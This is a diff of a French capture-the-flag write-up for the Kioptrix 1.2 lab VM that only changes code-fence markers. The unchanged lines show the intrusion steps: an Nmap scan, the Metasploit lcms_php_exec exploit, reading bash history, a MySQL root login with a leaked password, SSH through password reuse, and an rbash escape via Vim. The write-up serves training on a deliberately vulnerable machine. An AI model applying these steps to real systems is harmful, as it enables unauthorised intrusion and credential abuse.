@@ -8,7 +8,7 @@ Voici la solution du [CTF Kioptrix 1.2](https://www.vulnhub.com/entry/kioptrix-l
 CMS en mousse
 -------------
 
-```plain
+```
 Nmap scan report for 192.168.1.28
 Host is up (0.00019s latency).
 Not shown: 65532 closed ports
@@ -31,7 +31,7 @@ Au passage il y a aussi sur le site une galerie PHP dont on trouve facilement le
 
 Grace au module Metasploit l'exploitation est aisée :  
 
-```plain
+```
 msf exploit(lcms_php_exec) > show options
 
 Module options (exploit/multi/http/lcms_php_exec):
@@ -83,7 +83,7 @@ $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
 
 L'historique de l'un des utilisateurs est lisible :  
 
-```plain
+```
 www-data@Kioptrix3:/home$ cat loneferret/.bash_history
 sudo ht
 exit
@@ -91,7 +91,7 @@ exit
 
 Je décide de faire un tour du côté du MySQL :  
 
-```plain
+```
 www-data@Kioptrix3:/etc$ mysql -u root -p
 mysql -u root -p
 Enter password: fuckeyou
@@ -161,7 +161,7 @@ On retrouve facilement les mots de passe des utilisateurs qui sont respectivemen
 
 Ca tombe bien, dreg a le même mot de passe pour le système :  
 
-```plain
+```
 $ ssh dreg@192.168.1.28
 dreg@192.168.1.28's password: 
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
@@ -186,14 +186,14 @@ On est dans un environnement restreint (*rbash*) qui ne nous permet pas de sorti
 
 Heureusement on peu en sortir en passant par Vim via les commandes suivantes (définir un shell différent et l'exécuter) :  
 
-```plain
+```
 :set shell=/bin/bash
 :shell
 ```
 
 Mais en réalité tout celà ne sert à rien puisque le mot de passe pour *loneferret* est aussi bon :  
 
-```plain
+```
 dreg@Kioptrix3:~$ su loneferret         
 Password: 
 loneferret@Kioptrix3:/home/dreg$ id
